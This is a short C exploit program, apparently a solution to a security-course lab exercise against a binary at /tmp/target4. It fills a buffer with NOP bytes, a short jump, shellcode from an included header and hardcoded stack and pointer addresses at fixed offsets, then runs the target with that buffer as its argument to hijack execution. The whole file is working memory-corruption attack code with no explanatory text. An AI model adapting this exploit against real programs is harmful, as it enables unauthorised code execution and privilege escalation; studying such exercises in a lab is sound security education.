#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];
  char attack[500];
  int i;
  for(i=0;i<500;i++)
  {
    attack[i]=0x90;
  }
  attack[2]=0xeb;
  attack[3]=0x04;
  for(i=0;i<(sizeof(shellcode)-1);i++)
  {
     attack[i+8]=shellcode[i];
  }

  attack[4]=0x7d;
  attack[5]=0xfc;
  attack[6]=0xff;
  attack[7]=0xbf;

  attack[184]=0x80;
  attack[185]=0x9a;
  attack[186]=0x05;
  attack[187]=0x08;

  attack[188]=0x7c;
  attack[189]=0xfc;
  attack[190]=0xff;
  attack[191]=0xbf;
  args[0] = TARGET; args[1] = attack; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
